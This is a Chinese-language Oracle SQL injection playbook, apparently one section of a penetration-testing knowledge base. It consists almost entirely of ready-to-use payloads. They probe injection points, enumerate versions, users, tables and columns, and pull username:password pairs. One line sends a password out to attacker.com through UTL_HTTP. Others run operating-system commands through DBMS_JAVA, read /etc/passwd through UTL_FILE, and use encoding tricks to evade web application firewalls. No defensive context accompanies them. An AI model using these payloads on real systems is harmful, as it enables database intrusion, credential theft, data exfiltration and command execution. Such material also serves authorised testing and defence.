# Oracle注入

## 3.1 基础探测 (sqli-oracle-basic)

### 执行步骤

#### 1. 探测注入点

```sql
' OR 1=1--
' UNION SELECT NULL,NULL,NULL FROM DUAL--
```

#### 2. 获取版本信息

```sql
' UNION SELECT banner,NULL FROM v$version WHERE rownum=1--
' UNION SELECT version,NULL FROM v$instance--
```

#### 3. 获取用户信息

```sql
' UNION SELECT username,NULL FROM all_users--
' UNION SELECT user,NULL FROM DUAL--
' UNION SELECT SYS_CONTEXT('USERENV','SESSION_USER'),NULL FROM DUAL--
```

#### 4. 获取表名

```sql
' UNION SELECT table_name,NULL FROM all_tables WHERE owner='SCOTT'--
' UNION SELECT owner||'.'||table_name,NULL FROM all_tables--
```

#### 5. 获取列名

```sql
' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--
' UNION SELECT column_name||':'||data_type,NULL FROM all_tab_columns WHERE table_name='USERS'--
```

#### 6. 提取数据

```sql
' UNION SELECT username||':'||password,NULL FROM users--
' UNION SELECT * FROM (SELECT username,password FROM users) WHERE rownum<=1--
```

### WAF绕过

#### UTL_HTTP外带

```sql
' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT password FROM users WHERE rownum=1)),NULL FROM DUAL--
```

---

## 3.2 高级技术 (sqli-oracle-advanced)

### 执行步骤

#### 1. 检测Java权限

```sql
' UNION SELECT 1,CASE WHEN DBMS_JAVA.TEST_OUTPUT('test') IS NOT NULL THEN 'YES' ELSE 'NO' END FROM DUAL--
```

#### 2. 创建Java执行函数

```sql
' UNION SELECT 1,(SELECT DBMS_JAVA.RUNJAVA('java.lang.Runtime.exec("cmd /c whoami")') FROM DUAL)--
```

#### 3. UTL_FILE读取文件

```sql
' UNION SELECT 1,UTL_FILE.FGETATTR('DATA_PUMP_DIR','/etc/passwd','file_exists') FROM DUAL--
```

### WAF绕过

#### Oracle特有函数绕过

```sql
' UNION SELECT 1,XMLType('<root>'||CHR(60)||'data'||CHR(62)||user||'</data></root>') FROM DUAL--
' UNION SELECT 1,DBMS_PIPE.PACK_MESSAGE(user)||DBMS_PIPE.SEND_MESSAGE('pipe1') FROM DUAL--
' UNION SELECT 1,CASE WHEN (SELECT user FROM DUAL)='SYS' THEN 'admin' ELSE 'user' END FROM DUAL--
```

#### Oracle注释与编码绕过

```sql
' UNION/**/SELECT/**/1,user/**/FROM/**/DUAL--
' UNION SELECT 1,CHR(65)||CHR(68)||CHR(77)||CHR(73)||CHR(78) FROM DUAL--
' UNION SELECT 1,RAWTOHEX(user) FROM DUAL--
' UNION SELECT 1,UTL_RAW.CAST_TO_VARCHAR2(UTL_ENCODE.BASE64_ENCODE(UTL_RAW.CAST_TO_RAW(user))) FROM DUAL--
```
